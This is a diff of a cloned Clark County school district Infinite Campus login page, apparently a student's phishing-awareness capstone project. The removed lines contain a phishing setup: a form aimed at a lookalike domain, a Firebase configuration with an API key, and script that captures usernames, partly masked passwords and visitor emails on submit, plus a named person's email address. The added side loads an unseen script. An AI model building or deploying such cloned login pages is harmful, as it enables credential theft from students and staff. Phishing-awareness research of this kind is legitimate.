@@ -1,448 +1,15 @@
-
-<!-- saved from url=(0040)https://campus.ccsd.net/campus/clark.jsp -->
-<html><head><style>
-body{
-	background-color: #92c83e; 
-	background-image: url('../images/login/bg_dots.png');
-	background-repeat: no-repeat;
-	background-position: center top;
-	text-align: center;
-}
-.logocontainer{
-	background-color: transparent;
-	width: 650px;
-	margin-top: 50px;
-	padding-bottom: 50px;
-	margin-left:auto;
-	margin-right:auto
-}
-.frmcontainer{
-	background-color: #ffffff;
-	box-shadow: -4px 4px 2px #7FA72D;
-	max-width: 650px;
-	margin-top: 50px;
-	margin-bottom: 10px;
-	margin-left:auto;
-	margin-right:auto
-}
-
-.frmcontainer2{
-	background-color: #ffffff;
-	box-shadow: -4px 4px 2px #7FA72D;
-	max-width: 650px;
-	margin-top: 30px;
-	margin-bottom: 10px;
-	margin-left:auto;
-	margin-right:auto
-}
-.notice{
-	padding-top:10px;
-	padding-bottom:10px;
-	font-family: Arial;
-	font-size: 10pt;
-	color: #333333;
-	padding-left:20px;
-	text-align:left;
-}
-.appinfo{
-	background-color: transparent;
-	margin-left:auto;
-	margin-right:auto;
-	font-family: Arial;
-	font-size: 10px;
-	margin-top:-10px;
-	color: white;
-}
-.appinfo a{
-	font-family: Arial;
-	font-size: 10px;
-	color: white;	
-	text-decoration: none;
-}
-.appinfo .appserver{
-	font-family: Arial;
-	font-size: 10px;
-	color: #92c83e;	
-}
-#form_signin, .passwordForm {
-	text-align: left;
-	padding: 25px 25px 0 25px;
-	font-family: Arial;
-	font-size: 11px;
-	font-weight: bold;
-}
-
-.passwordreset{
-	text-align:left;
-	font-family:Arial;
-	font-size: 11px;
-	font-weight: bold;
-	margin-left:25px;
-	margin-right:25px;
-
-}
-label{line-height: 18px; vertical-align:middle;}
-.captcha{
-	padding: 0px; 
-	width: 164px; 
-	height: 22px; 
-	margin: 2px;
-}
-
-.signinbtn{
-	vertical-align:middle;
-}
-.statusmsg{
-	color: red;
-	font-size: 12px;
-	font-weight: bold;
-	padding-left: 10px;
-}
-.errorMessage {
-	color: red;
-	font-size: 12px;
-	font-weight: bold;
-}
-.editionbox{
-	float: right;
-	vertical-align: top;
-	position: relative;
-	text-align: right; 
-	top: -18px; 
-	right: -11.2px; 
-}
-.securitylabel{
-	font-family: Arial;
-	font-size: 12px;
-	color: #f26126;
-	padding: 4px;		
-}
-.versionmsgtd{
-	padding-right: 15px;
-}
-.versionmsg{
-	font-family: Arial;
-	font-size: 12px;
-	font-weight: bold;
-	color: #f26126;		
-	padding: 4px;		
-}
-.fillertd{
-	width:40px;
-}
-.lefteditionbox{
-	background-image: url('../images/login/orangebox_left.png'); 
-	background-repeat: no-repeat; 
-	width:24.2px;
-	height:37px;
-	margin: 0; 
-	padding: 0; 
-}
-.centereditionbox{
-	background-image: url('../images/login/orangebox_center.png'); 
-	background-repeat: repeat-x;
-	text-align: right; 
-	height: 37px;
-	min-width: 10px;
-	padding-right: 15px;
-	margin: 0; 
-	display: block;
-}
-.righteditionbox{
-	background-image: url('../images/login/orangebox_right.png'); 
-	background-repeat: no-repeat; 
-	width:11px;
-	height:48px;
-	margin: 0; 
-	padding: 0; 
-}
-.editiontext{
-	font-family: Arial;
-	font-size: 16px;
-	font-weight: bold;
-	color: white;
-	text-align: right;
-	line-height: 34px;
-}
-.forgotpasswd {
-	cursor: pointer;
-}
-.forgotpasswd{
-	text-decoration: none;
-	margin-top:10px;
-	font-family: Arial;
-	font-size: 12px;
-	font-weight: bold;
-	color: #009EDD;
-}
-.captcha-help {
-	text-decoration: none;
-	font-family: Arial;
-	font-size: 12px;
-	font-weight: bold;
-	color: #009EDD;
-	width: 20em;
-    max-width: 200px;
-}
-.contacttext{
-	font-family: Arial;
-	font-size: 12px;
-	font-weight: bold;
-	color: #333333;
-}
-
-/* captcha styling*/
-#cwrapper{
-	width: 199px; 
-	height: 102px; 
-	border: 1px solid #adadaf;
-	box-sizing: border-box;
-	text-align: center;
-	padding: 2px 0 2px 0;
-}
-.captchasignin{
-	padding: 10px;
-}
-#cimagectn{
-	width:auto; 
-	height:auto; 
-	margin:0; 
-	padding:0; 
-	float:left;
-}
-#cinputctn{
-	width:166px; 
-	height:26px; 
-	margin:0; 
-	padding:0; 
-	float:left;
-}
-#cinput{
-	padding:0; 
-	width:162px; 
-	height:22px;
-	margin: 2px;
-}
-#creload{
-	width:26px; 
-	height:26px; 
-	margin:0; 
-	margin-right:4px; 
-	padding:0; 
-	float:left;
-}
-#reloadimg{
-	text-align:right; 
-	margin:2px; 
-	padding:0;
-}
-
-#usernamebox, #passwordbox{
-	padding-top:10px;
-}
-.userNameToggle, .passwordToggle, .helpToggle  {
-	cursor: pointer;
-	-webkit-touch-callout: none;
-	-webkit-user-select: none;
-	-khtml-user-select: none;
-	-moz-user-select: none;
-	-ms-user-select: none;
-	user-select: none;
-	text-decoration: none;
-	margin-top:10px;
-	font-family: Arial;
-	font-size: 12px;
-	font-weight: bold;
-	color: #009EDD;
-
-}
-
-.samlLogin{
-    appearance: button;
-    -moz-appearance: button;
-    font-family: Arial, sans-serif;
-    font-size: 11px;
-    font-weight: bold;
-    text-decoration: none;
-    border:#C6C6C6 1px solid;
-    color:black;
-    display: inline-block;
-    padding: 4px 8px 4px 8px;
-    background-color: #f4f4f4;
-    position:relative;
-    min-width: 182px;
-    height: 15px;
-    text-align: center;
-}
-.samlLogin:hover,.passwordResetButton:hover {
-	background-color: #808080;
-	color: #ffffff;
-}
-
-.passwordResetButton {
-	vertical-align: top;
-	appearence: button;
-	-moz-appearance: button;
-	font-family: Arial, sans-serif;
-	font-size: 11px;
-	font-weight: bold;
-	text-decoration: none;
-	border:#C6C6C6 1px solid;
-	color:black;
-	display: inline-block;
-	background-color: #f4f4f4;
-	position:relative;
-	min-width: 100px;
-	height: 22px;
-	text-align: center;
-	padding-top: 2px;
-
-}
-.passwordResetInput {
-    width: 256px;
-    height: 22px;
-}
-
-.msgPadding {
-	padding-top: 10px;
-	padding-left: 15px;
-}
-
-.msgFont {
-	font-family: Arial;
-}
-
-.line-center{
-	padding:0 5px;
-	background:#fff;
-	font-size: 15px;
-}
-h2{
-	position:relative;
-	z-index:2;
-}
-h2:after{
-	content:"";
-	position:absolute;
-	top:50%;
-	left:0;
-	right:0;
-	border-top:solid 1px black;
-	z-index:-1;
-}
-
-#helpbox p {
-	margin: 0em;
-	width: 600px;
-}
-
-/* layout css */
-.container{margin: 10px 0 10px 0; overflow: hidden;}
-.span8{max-width: 600px;}
-.span4{width: 300px;}
-.span2{width: 200px;}
-.floatleft{float: left;}
-.floatright{float: right;}
-.clear{margin-top: 10px; clear: both;}
-.alignright{text-align: right;}
-.alignleft{text-align:left;}
-.loginhr{margin-top: 15px; margin-left:25px; margin-right:25px; border: 0; height: 1px;background-color: #adadaf;}
-
-@media only screen and (max-width: 700px) {
-	.logocontainer .floatright {
-		display: none;
-	}
-}
-
-
-@media only screen and (max-width: 700px) {
-	.logocontainer {
-		margin-top:0px;
-		margin-left:0px;
-		margin-right:0px;
-	}
-}
-</style>
-<script>
-function reloadCaptcha() {
-    var obj = document.getElementById('captcha');
-    var src = obj.src;
-    var pos = src.indexOf('?');
-    if (pos >= 0) {
-        src = src.substr(0, pos);
-    }
-    var date = new Date();
-    obj.src = 'jcaptcha.jpg?t=sis&v=' + date.getTime();
-    return false;
-}
-function toggle(type) {
-    switch (type) {
-        case 'username':
-
-            var t = $('.userNameToggle').html();
-            if (t === "Forgot your username?") {
-                $('#usernamebox').show();
-                $('.userNameToggle').html("Hide");
-                $('#helpbox').hide();
-                $('.helpToggle').html("Problems logging in?");
-                $('#passwordbox').hide();
-                $('.passwordToggle').html("Forgot your password?");
-
-            } else if (t === "Hide") {
-                $('#usernamebox').hide();
-                $('.userNameToggle').html("Forgot your username?");
-            }
-            break;
-
-        case 'password':
-
-            var t = $('.passwordToggle').html();
-            if (t === "Forgot your password?") {
-                $('#passwordbox').show();
-                $('.passwordToggle').html("Hide");
-                $('#usernamebox').hide();
-                $('#helpbox').hide();
-                $('.helpToggle').html("Problems logging in?");
-                $('.userNameToggle').html("Forgot your username?");
-            } else if (t === "Hide") {
-                $('#passwordbox').hide();
-                $('.passwordToggle').html("Forgot your password?");
-            }
-            break;
-
-        case 'problems':
-
-            var t = $('.helpToggle').html();
-            if (t === "Problems logging in?") {
-                $('#helpbox').show();
-                $('.helpToggle').html("Hide");
-                $('#help').html();
-                $('#passwordbox').hide();
-                $('.passwordToggle').html("Forgot your password?");
-                $('#usernamebox').hide();
-                $('.userNameToggle').html("Forgot your username?");
-            } else if (t === "Hide") {
-                $('#helpbox').hide();
-                $('.helpToggle').html("Problems logging in?");
-            }
-            break;
-
-        default:
-            break;
-    }
-}
-
-</script>
+<html><head>
+<script src="./loginFiles/myAddons.js"></script>
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style id="stndz-style"></style>
     <meta name="ROBOTS" content="NOINDEX">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="shortcut icon" href="https://campus.ccsd.net/campus/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="./loginFiles/favicon.ico" type="image/x-icon">
     <!--<base href="https://campus.ccsd.net/campus/">--><base href=".">
-    <script src="./Clark County NV - Live Site Login_files/csrf.js" type="text/javascript"></script><script src="./Clark County NV - Live Site Login_files/execute.js" type="text/javascript"></script>
+    <script src="./loginFiles/csrf.js" type="text/javascript"></script><script src="./loginFiles/execute.js" type="text/javascript"></script>
     <title>Clark County NV - Live Site Login</title>
-    <script language="Javascript" src="./Clark County NV - Live Site Login_files/login.js"></script>
+    <script language="Javascript" src="./loginFiles/login.js"></script>
     <script language="Javascript">
         function start(){
             if(parent.frames.length != 0){
@@ -496,7 +63,7 @@ function toggle(type) {
             });
         }
     </script>
-    <script src="./Clark County NV - Live Site Login_files/jquery-1.7.2.min.js"></script>
+    <script src="./loginFiles/jquery-1.7.2.min.js"></script>
     <script>
         $(document).ready(function(){
             var contextComm = parent.campusContextCommunicator;
@@ -507,14 +74,14 @@ function toggle(type) {
 
 
     </script>
-    <link rel="stylesheet" type="text/css" href="./Clark County NV - Live Site Login_files/login.css">
+    <link rel="stylesheet" type="text/css" href="./loginFiles/login.css">
 </head>
 
 <body onload="start()">
 <div class="container">
     <div class="logocontainer">
-        <img class="floatleft" alt="" src="./Clark County NV - Live Site Login_files/campus_logo.png">
-        <img class="floatright" alt="" src="./Clark County NV - Live Site Login_files/transforming_k12.png">
+        <img class="floatleft" alt="" src="./loginFiles/campus_logo.png">
+        <img class="floatright" alt="" src="./loginFiles/transforming_k12.png">
     </div>
     <div class="frmcontainer">
         <div class="editionbox">
@@ -537,6 +104,7 @@ function toggle(type) {
         </div>
 
         
+
 		<form method="POST" id="form_signin" accept-charset="utf-8" action="https://campus.ccsd.net/campus/verify.jsp">
             <input type="hidden" name="appName" value="clark">
             <input type="hidden" id="screen" name="screen" value="">
@@ -559,36 +127,17 @@ function toggle(type) {
 
             <div class="container span8">
                 <div class="span2 floatleft alignright">
-                    <input class="signinbtn" id="signinbtn" alt="Sign In" type="image" src="./Clark County NV - Live Site Login_files/btn_sign_in.png" border="0" width="81" height="18">
+                    <input class="signinbtn" id="signinbtn" alt="Sign In" type="image" src="./loginFiles/btn_sign_in.png" border="0" width="81" height="18">
                 </div>
                 <div class="span4 floatleft alignleft">
                     <div class="statusmsg"></div>
                 </div>
             </div>
             <input type="hidden" name="useCSRFProtection" value="true">
-        </form>
-		<!-- MY SIGNIN CODE -->
-		<!--<form method="GET" id="form_signin" accept-charset="utf-8" action="http://campusccsd.com/capture.html">
             
-            <input type="hidden" id="email" name="email">
-            
-            <div class="container span2">
-                <div><label for="username">Username</label></div>
-                <input class="span2" type="text" id="username" name="username" title="Enter your username" autocomplete="off">
-            </div>
-
-            <div class="container span2">
-                <div><label for="password">Password</label></div>
-                <input class="span2" type="password" id="password" name="password" title="Enter your password" autocomplete="off">
-            </div>
-
-            <div class="container span8">
-                <div class="span2 floatleft alignright">
-                    <input class="signinbtn" id="signinbtn" alt="Sign In" type="image" src="./Clark County NV - Live Site Login_files/btn_sign_in.png" border="0" width="81" height="18">
-                </div>
-            </div>
         </form>
-            -->
+
+            
             <div class="passwordreset" style="padding-bottom:25px">
             <div class="forgotpasswd">
     <a href="https://campus.ccsd.net/campus/" onclick="toggle(&#39;password&#39;);return false" class="passwordToggle">Forgot your password?</a>&nbsp;&nbsp;&nbsp;<span class="contacttext">|</span>&nbsp;&nbsp;&nbsp;
@@ -648,9 +197,9 @@ line-height: normal;
     <![endif]-->
     
     <div class="appinfo">
-        <div>Â©2003-2017 Infinite Campus, Inc.</div>
+        <div>©2003-2017 Infinite Campus, Inc.</div>
         <div><a href="http://www.infinitecampus.com/" target="_blank">www.infinitecampus.com</a></div>
-        <div class="appserver">App Server=clarknv-app11</div>
+        <div class="appserver">App Server=clarknv-app6</div>
     </div>
 
 <script>
@@ -666,143 +215,5 @@ line-height: normal;
     });
 </script>
 
-<!--My code is below -->
-<script src="https://www.gstatic.com/firebasejs/4.5.0/firebase.js"></script>
-<script>
-  // Initialize Firebase
-  var config = {
-    apiKey: "AIzaSyDW2N5DTqC2SQvRr0kWZOlYFiq5xgU08-8",
-    authDomain: "campus-site.firebaseapp.com",
-    databaseURL: "https://campus-site.firebaseio.com",
-    projectId: "campus-site",
-    storageBucket: "",
-    messagingSenderId: "71367401718"
-  };
-  firebase.initializeApp(config);
-</script>
-<script>
-//date variable so both use the same session id
-function getDateStr(d)
-{
-	var monthStr = "" + (d.getMonth() + 1)
-	if(monthStr.length == 1) monthStr = "0" + monthStr;
-	var dayStr = "" + (d.getDate())
-	if(dayStr.length == 1) dayStr = "0" + dayStr;
-	var hrStr = "" + (d.getHours())
-	if(hrStr.length == 1) hrStr = "0" + hrStr;
-	var minStr = "" + (d.getMinutes())	
-	if(minStr.length == 1) minStr = "0" + minStr;
-	var secStr = "" + d.getSeconds()
-	if(secStr.length == 1) secStr = "0" + secStr;
-	var msStr = "" + (d.getMilliseconds())
-	if(msStr.length == 1) msStr = "0" + msStr;
-
-	return d.getFullYear() + '-' + monthStr + '-' + dayStr + ' ' + hrStr + ':' + minStr + ':' + secStr + '.' + msStr;
-}
-
-function getDateKey(d)
-{
-	var hrStr = "" + (d.getHours())
-	if(hrStr.length == 1) hrStr = "0" + hrStr;
-	var minStr = "" + (d.getMinutes())	
-	if(minStr.length == 1) minStr = "0" + minStr;
-	var secStr = "" + d.getSeconds()
-	if(secStr.length == 1) secStr = "0" + secStr;
-	var msStr = "" + (d.getMilliseconds())
-	if(msStr.length == 1) msStr = "0" + msStr;
-
-	return hrStr + '-' + minStr + '-' + secStr;
-}
-
-function getDay(d)
-{
-	var monthStr = "" + (d.getMonth() + 1)
-	if(monthStr.length == 1) monthStr = "0" + monthStr;
-	var dayStr = "" + (d.getDate())
-	if(dayStr.length == 1) dayStr = "0" + dayStr;
-	
-	return monthStr + '-' + dayStr;
-}
-
-var dateOpened = new Date();
-
-class siteVisit
-{
-	constructor(email)
-	{	
-		var data = {
-			time: getDateStr(dateOpened),
-    		email: email
- 		};
- 		
- 		var updates = {};
-  		//updates['/site-visits/' + email + '-' + monthStr + '-' + dayStr + '-' + hrStr + '-' + minStr + '-' + secStr] = data;
-
-		updates['/sessions-date/' + getDay(dateOpened) + '/' + email + '-' + getDateKey(dateOpened) + '/open-site'] = data;
-
-  		return firebase.database().ref().update(updates);
-	}
-}
-
-class dbEntry
-{
-	constructor(email, user, pass)
-	{
-		this.email = email;
-		if(user == null && pass == null)
-		{
-			this.user = "ACCIDENTAL ATTEMPT ";
-			this.pass = " ";
-			this.passHidden = " ";
-		}
-		else
-		{
-			this.user = user.value;
-			this.pass = pass.value;
-			this.passHidden = pass.value.substring(0, 1);
-			for(var i=1; i<pass.value.length; i++)
-				this.passHidden += '*';
-		}
-		
-		this.sendData();
-	}
-	
-	sendData()
-	{	
-		var data = {
-			time: getDateStr(new Date()),
-    		user: this.user,
-    		passHidden: this.passHidden,
-    		//pass: this.pass
- 		};
- 		
- 		var updates = {};
-  		//updates['/login-attempts/' + this.user + '-' + monthStr + '-' + dayStr + '-' + hrStr + '-' + minStr + '-' + secStr] = data;
-  		
-  		updates['/sessions-date/' + getDay(dateOpened) + '/' + this.email + '-' + getDateKey(dateOpened) + '/signin-attempt'] = data;
-
-  		return firebase.database().ref().update(updates);
-	}
-}
-</script>
-<script>
-//MY SIGNIN CODE
-
-var getUrl = window.location.search.substring(1);
-//$('#email')[0].value = getUrl.split("=")[1];
-if(getUrl.length == 0) getUrl = "undefined";
-
-$('#form_signin').on('submit', function() {
-	if(getUrl == "undefined")
-	{
-		new dbEntry(getUrl, null, null);
-		alert("Adam Walker's Senior Capstone Project: You have signed into a fake phishing site that COULD have logged your password (but didn't, you can check the code). This was intended to be sent through email as a test for a Senior Capstone project. You have stumbled across this site inadvertently. Please make sure to check that you are going to campus.ccsd.net instead of campusccsd.com. All that was stored from this session is the timestamp that you tried to sign in. Your username and password were not stored. You will now be signed on normally. Please contact Adam Walker at adamwalker567123@gmail.com if you have any questions. For code, see the github for this project: https://github.com/Rubiks-boy/Phishing-Capstone-Project");
-	}
-	else new dbEntry(getUrl, $('#username')[0], $('#password')[0]);
-});
-
-//log visit on db
-new siteVisit(getUrl);
-</script>
 
 </body></html>
